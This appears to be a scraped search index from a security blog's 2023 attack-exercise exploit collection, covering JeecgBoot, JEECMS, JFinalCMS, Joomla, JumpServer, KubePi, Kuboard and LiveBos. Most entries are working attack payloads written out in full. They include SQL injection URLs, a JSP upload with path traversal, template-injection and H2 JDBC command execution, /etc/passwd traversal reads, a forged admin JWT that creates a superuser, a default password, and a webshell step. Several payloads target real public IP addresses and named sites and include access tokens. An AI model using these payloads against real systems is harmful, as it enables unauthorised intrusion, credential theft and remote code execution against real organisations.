https://150.138.118.194:82/platform/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user%20limit%201,10/*,%20'/x.js ","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"山东省核酸 https://naats.sdcdc.cn:7777//sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js ","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"上传 POST /api/sys/common/upload HTTP/1.1 Host: www.qdctjt.com Connection: close Content-Length: 285 sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\" Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2cEzGmnqorzv3hWA X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODI1MTE1NjcsInVzZXJuYW1lIjoiYWRtaW4ifQ.7Rd9H6-qhBW0ZKIjU29IoSbjqJqrLF3lUVRIq8UMy4A User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 sec-ch-ua-platform: \"macOS\" Accept: */* Origin: http://admin.qdctjt.com Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://admin.qdctjt.com/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 ------WebKitFormBoundary2cEzGmnqorzv3hWA Content-Disposition: form-data; name=\"biz\" ../../ ------WebKitFormBoundary2cEzGmnqorzv3hWA Content-Disposition: form-data; name=\"file\"; filename=1.jsp p Content-Type: image/png GIF89a 111 ------WebKitFormBoundary2cEzGmnqorzv3hWA-- ","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"数据库 GET /sys/dataSource/list HTTP/1.1 Host: 58.59.2.164:8081 Accept: application/json, text/plain, */* tenant_id: 0 X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUwOTcxNTYsInVzZXJuYW1lIjoiMTMxNzMwMzI5MjQifQ.A6dBltBwYXmdZ2CTl3qJrZFpgxGxVu_iGMnizG9Ou2k User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Referer: http://58.59.2.164:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"JeecgBoot-企业级低代码平台\" ","date":"2023-12-08","objectID":"/jeecgboot%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9Ecve-2021-37304jeecg-bootactuatorhttptrace.md/:0:0","tags":["2023hw"],"title":"JeecgBoot不安全权限漏洞（CVE-2021-37304）jeecg-bootactuatorhttptrace.md","uri":"/jeecgboot%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9Ecve-2021-37304jeecg-bootactuatorhttptrace.md/"},{"categories":["2023hw"],"content":"exp http://119.91.148.24/jeecg-boot/actuator/httptrace/ http://120.224.56.221:8081/sys/user/querySysUser?username=admin ","date":"2023-12-08","objectID":"/jeecgboot%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9Ecve-2021-37304jeecg-bootactuatorhttptrace.md/:1:0","tags":["2023hw"],"title":"JeecgBoot不安全权限漏洞（CVE-2021-37304）jeecg-bootactuatorhttptrace.md","uri":"/jeecgboot%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9Ecve-2021-37304jeecg-bootactuatorhttptrace.md/"},{"categories":["2023hw漏洞"],"content":"JeecgBoot sql注入漏洞 POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 Host: 192.168.90.1:3100 Origin: http://192.168.90.1:3100 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 123 {\"sql\":\"select 'result:\u003c#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()\u003e ${ ex(\\\"open -a calculator.app \\\") }' \"} ","date":"2023-12-08","objectID":"/jeecgboot%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"JeecgBoot漏洞","uri":"/jeecgboot%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"JeecgBoot SSTI 漏洞 POST /jeecgboot/jmreport/testConnection HTTP/1.1 Host: 192.168.90.1:3100 Content-Length: 383 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://192.168.90.1:3100 Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close { \"id\": \"1\", \"code\": \"dataSource1\", \"dbType\": \"H2\", \"dbDriver\": \"org.h2.Driver\", \"dbUrl\": \"jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\\u000A$$\", \"dbName\": \"test\", \"dbUsername\": \"sa\", \"dbPassword\": \"\", \"connectTimes\": 5 } ","date":"2023-12-08","objectID":"/jeecgboot%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"JeecgBoot漏洞","uri":"/jeecgboot%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/ ","date":"2023-12-08","objectID":"/jeecgboot%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"JeecgBoot漏洞","uri":"/jeecgboot%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"https://forum.butian.net/share/158\r","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"fofa app=\"JEECMS\" ","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"任意文件上传 ","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"登录获取jwt POST /thirdParty/bind HTTP/1.1 Host: 60.221.255.224 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Accept-Encoding: gzip Content-Length: 75 {\"username\":\"7A2AE2\",\"loginWay\": 1, \"loginType\": \"QQ\", \"thirdId\": \"7A2AE2\"} ","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:1","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"上传html POST /member/upload/o_upload HTTP/1.1 Host: 60.221.255.224 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952 Jeecms-Auth-Token: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI3QTJBRTIiLCJjcmVhdGVkIjoxNjgwMDc2NjYwMDcxLCJ1c2VyU291cmNlIjoiYWRtaW4iLCJleHAiOjE2ODAwNzc4NjB9.TeYSmvg7T_I4tcsp5OquCrk8ggmwkrttoZ7-3yWFpUmOctZSDoRipEddc8JsxJkH2M85Xf71oTGPZ_X5u5m5Aw Accept-Encoding: gzip Content-Length: 602 -----------------------------1250178961143214655620108952 Content-Disposition: form-data; name=\"uploadFile\"; filename=\"a.html\" Content-Type: text/html ${site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.ObjectWrapper\").getField(\"DEFAULT_WRAPPER\").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.utility.Execute\"), null)(cmd)} -----------------------------1250178961143214655620108952 Content-Disposition: form-data; name=\"typeStr\" File -----------------------------1250178961143214655620108952-- ","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:2","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"拼接路径 https://60.221.255.224/..-..-..-..-..-u-cms-www-202303-2915574001x5.htm?cmd=cmd.exe%20/c%20dir,ls ","date":"2023-12-08","objectID":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:3","tags":["2023hw"],"title":"JEECMS o_upload 任意文件上传","uri":"/jeecms-o_upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"JFinalCMS 任意文件读取漏洞(CVE-2023-41599) ","date":"2023-12-08","objectID":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/:1:0","tags":["2023hw漏洞"],"title":"JFinalCMS 任意文件读取漏洞(CVE-2023-41599)","uri":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/"},{"categories":["2023hw漏洞"],"content":"特征 fofa: body=\"content=\\\"JreCms\" hunter: web.body=\"content=\\\"JreCms\" ","date":"2023-12-08","objectID":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/:2:0","tags":["2023hw漏洞"],"title":"JFinalCMS 任意文件读取漏洞(CVE-2023-41599)","uri":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/"},{"categories":["2023hw漏洞"],"content":"POC Windows: /../../../../../../../../../test.txt Linux: /../../../../../../../../../etc/passwd /common/down/file?filekey=/../../../../../../../../../etc/passwd ","date":"2023-12-08","objectID":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/:3:0","tags":["2023hw漏洞"],"title":"JFinalCMS 任意文件读取漏洞(CVE-2023-41599)","uri":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 http://www.so1lupus.ltd/2023/08/28/Directory-traversal-in-JFinalCMS/ ","date":"2023-12-08","objectID":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/:4:0","tags":["2023hw漏洞"],"title":"JFinalCMS 任意文件读取漏洞(CVE-2023-41599)","uri":"/jfinalcms-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2023-41599/"},{"categories":["2023hw漏洞"],"content":"Joomla 未授权漏洞 CVE-2023-23752 受影响的版本：4.0.0 ~ 4.2.7 存在漏洞的路由为Rest API，Rest API于4.x正式开发 ","date":"2023-12-08","objectID":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/:1:0","tags":["2023hw漏洞"],"title":"Joomla 未授权漏洞CVE-2023-23752","uri":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/"},{"categories":["2023hw漏洞"],"content":"下载地址： https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.zip?format=zip ","date":"2023-12-08","objectID":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/:2:0","tags":["2023hw漏洞"],"title":"Joomla 未授权漏洞CVE-2023-23752","uri":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/"},{"categories":["2023hw漏洞"],"content":"Payload 通过此API用于获取网站最重要的配置信息，其中包含数据库的账号与密码。 /api/index.php/v1/config/application?public=true ","date":"2023-12-08","objectID":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/:3:0","tags":["2023hw漏洞"],"title":"Joomla 未授权漏洞CVE-2023-23752","uri":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/"},{"categories":["2023hw漏洞"],"content":"其他api v1/banners v1/banners/:id v1/banners v1/banners/:id v1/banners/:id v1/banners/clients v1/banners/clients/:id v1/banners/clients v1/banners/clients/:id v1/banners/clients/:id v1/banners/categories v1/banners/categories/:id v1/banners/categories v1/banners/categories/:id v1/banners/categories/:id v1/banners/:id/contenthistory v1/banners/:id/contenthistory/keep v1/banners/:id/contenthistory v1/config/application v1/config/application v1/config/:component_name v1/config/:component_name v1/contacts/form/:id v1/contacts v1/contacts/:id v1/contacts v1/contacts/:id v1/contacts/:id v1/contacts/categories v1/contacts/categories/:id v1/contacts/categories v1/contacts/categories/:id v1/contacts/categories/:id v1/fields/contacts/contact v1/fields/contacts/contact/:id v1/fields/contacts/contact v1/fields/contacts/contact/:id v1/fields/contacts/contact/:id v1/fields/contacts/mail v1/fields/contacts/mail/:id v1/fields/contacts/mail v1/fields/contacts/mail/:id v1/fields/contacts/mail/:id v1/fields/contacts/categories v1/fields/contacts/categories/:id v1/fields/contacts/categories v1/fields/contacts/categories/:id v1/fields/contacts/categories/:id v1/fields/groups/contacts/contact v1/fields/groups/contacts/contact/:id v1/fields/groups/contacts/contact v1/fields/groups/contacts/contact/:id v1/fields/groups/contacts/contact/:id v1/fields/groups/contacts/mail v1/fields/groups/contacts/mail/:id v1/fields/groups/contacts/mail v1/fields/groups/contacts/mail/:id v1/fields/groups/contacts/mail/:id v1/fields/groups/contacts/categories v1/fields/groups/contacts/categories/:id v1/fields/groups/contacts/categories v1/fields/groups/contacts/categories/:id v1/fields/groups/contacts/categories/:id v1/contacts/:id/contenthistory v1/contacts/:id/contenthistory/keep v1/contacts/:id/contenthistory v1/content/articles v1/content/articles/:id v1/content/articles v1/content/articles/:id v1/content/articles/:id v1/content/categories v1/content/categories/:id v1/content/categories v1/content/categories/:id v1/content/categories/:id v1/fields/content/articles v1/fields/content/articles/:id v1/fields/content/articles v1/fields/content/articles/:id v1/fields/content/articles/:id v1/fields/content/categories v1/fields/content/categories/:id v1/fields/content/categories v1/fields/content/categories/:id v1/fields/content/categories/:id v1/fields/groups/content/articles v1/fields/groups/content/articles/:id v1/fields/groups/content/articles v1/fields/groups/content/articles/:id v1/fields/groups/content/articles/:id v1/fields/groups/content/categories v1/fields/groups/content/categories/:id v1/fields/groups/content/categories v1/fields/groups/content/categories/:id v1/fields/groups/content/categories/:id v1/content/articles/:id/contenthistory v1/content/articles/:id/contenthistory/keep v1/content/articles/:id/contenthistory v1/extensions v1/languages/content v1/languages/content/:id v1/languages/content v1/languages/content/:id v1/languages/content/:id v1/languages/overrides/search v1/languages/overrides/search/cache/refresh v1/languages/overrides/site/zh-CN v1/languages/overrides/site/zh-CN/:id v1/languages/overrides/site/zh-CN v1/languages/overrides/site/zh-CN/:id v1/languages/overrides/site/zh-CN/:id v1/languages/overrides/administrator/zh-CN v1/languages/overrides/administrator/zh-CN/:id v1/languages/overrides/administrator/zh-CN v1/languages/overrides/administrator/zh-CN/:id v1/languages/overrides/administrator/zh-CN/:id v1/languages/overrides/site/en-GB v1/languages/overrides/site/en-GB/:id v1/languages/overrides/site/en-GB v1/languages/overrides/site/en-GB/:id v1/languages/overrides/site/en-GB/:id v1/languages/overrides/administrator/en-GB v1/languages/overrides/administrator/en-GB/:id v1/languages/overrides/administrator/en-GB v1/languages/overrides/administrator/en-GB/:id v1/languages/overrides/administrator/en-GB/:id v1/languages v1/languages v1/media/adapters v1/media/adapters/:id v1/media/files v1/media/files/:path/ v1/media/files/:path v1/media/files v1/med","date":"2023-12-08","objectID":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/:4:0","tags":["2023hw漏洞"],"title":"Joomla 未授权漏洞CVE-2023-23752","uri":"/joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2023-23752/"},{"categories":["2023hw漏洞"],"content":"jshERP 信息泄露漏洞 ","date":"2023-12-08","objectID":"/jsherp%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"jshERP信息泄露漏洞","uri":"/jsherp%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC GET /jshERP-boot/user/getAllList;.ico HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/jsherp%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"jshERP信息泄露漏洞","uri":"/jsherp%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"CVE-2023-42442 ","date":"2023-12-08","objectID":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"JumpServer未授权漏洞","uri":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 3.0.0 \u003c= JumpServer \u003c= 3.5.4 3.6.0 \u003c= JumpServer \u003c= 3.6.3 ","date":"2023-12-08","objectID":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"JumpServer未授权漏洞","uri":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa icon_hash=\"-1162630024\" ","date":"2023-12-08","objectID":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"JumpServer未授权漏洞","uri":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Hunter app.name=\"JumpServer\" ","date":"2023-12-08","objectID":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"JumpServer未授权漏洞","uri":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC JumpServer 是一款开源的堡垒机。 在JumpServer受影响版本中，由于/api/v1/terminal/sessions/接口没有添加权限认证，未授权的攻击者可以通过访问/api/v1/terminal/sessions/?limit=1，获取堡垒机terminal的session信息 /api/v1/terminal/sessions/?limit=1 ","date":"2023-12-08","objectID":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"JumpServer未授权漏洞","uri":"/jumpserver%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463\r","date":"2023-12-08","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:0:0","tags":["2023hw"],"title":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":["2023hw"],"content":"漏洞描述 KubePi 中存在 JWT硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户 ","date":"2023-12-08","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:1:0","tags":["2023hw"],"title":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":["2023hw"],"content":"漏洞影响 KubePi ","date":"2023-12-08","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:2:0","tags":["2023hw"],"title":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":["2023hw"],"content":"网络测绘 “kubepi” ","date":"2023-12-08","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:3:0","tags":["2023hw"],"title":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC POST /kubepi/api/v1/users HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 accept: application/json Accept-Encoding: gzip, deflate Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8 { \"authenticate\": { \"password\": \"{{randstr}}\" }, \"email\": \"{{randstr}}@qq.com\", \"isAdmin\": true, \"mfa\": { \"enable\": false }, \"name\": \"{{randstr}}\", \"nickName\": \"{{randstr}}\", \"roles\": [ \"Supper User\" ] } ","date":"2023-12-08","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:4:0","tags":["2023hw"],"title":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":["2023hw漏洞"],"content":"Kuboard默认口令 漏洞描述： Kuboard，是一款免费的 Kubernetes 图形化管理工具，Kuboard 力图帮助用户快速在 Kubernetes 上落地微服务。Kuboard存在默认口令可以通过默认口令登录Kuboard，管理Kubernetes。 admin/kuboard123 ","date":"2023-12-08","objectID":"/kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/:1:0","tags":["2023hw漏洞"],"title":"Kuboard默认口令","uri":"/kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"LiveBos\" || body=\"/react/browser/loginBackground.png\" ","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc 写入冰蝎 ","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"1 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 6577 